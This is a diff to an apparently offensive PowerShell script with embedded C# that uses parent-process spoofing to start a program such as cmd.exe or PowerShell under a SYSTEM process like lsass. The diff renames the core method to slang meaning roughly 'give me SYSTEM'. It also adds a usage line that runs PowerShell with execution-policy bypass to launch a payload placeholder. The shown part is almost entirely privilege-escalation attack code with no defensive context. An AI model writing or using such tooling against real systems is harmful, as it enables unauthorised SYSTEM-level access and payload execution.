@@ -1,6 +1,8 @@
-#usage: [AkuDitemeninOrangTuaKu]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
-#[AkuDitemeninOrangTuaKu]::CreateProcessFromParent(<lsass_pid>,<executeable>,"<executeable_arguments>"")
-#[AkuDitemeninOrangTuaKu]::CreateProcessFromParent(436,"C:\Windows\System32\cmd.exe","")
+#usage: [AkuDitemeninOrangTuaKu]::MintakSYSTEMCuk(<system_pid>,<command_to_execute>)
+#[AkuDitemeninOrangTuaKu]::MintakSYSTEMCuk(<lsass_pid>,<executeable>,"<executeable_arguments>"")
+#[AkuDitemeninOrangTuaKu]::MintakSYSTEMCuk(436,"C:\Windows\System32\cmd.exe","")
+#[AkuDitemeninOrangTuaKu]::MintakSYSTEMCuk(436,"C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe","-nop -ep bypass -NoExit -Command `"<execute_payload>`"")
+
 $mycode = @"
 using System;
 using System.Diagnostics;
@@ -85,7 +87,7 @@ public class AkuDitemeninOrangTuaKu
         public int bInheritHandle;
     }
 
-	public static void CreateProcessFromParent(int ppid, string command, string cmdargs)
+	public static void MintakSYSTEMCuk(int ppid, string command, string cmdargs)
     {
         const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
         const uint CREATE_NEW_CONSOLE = 0x00000010;
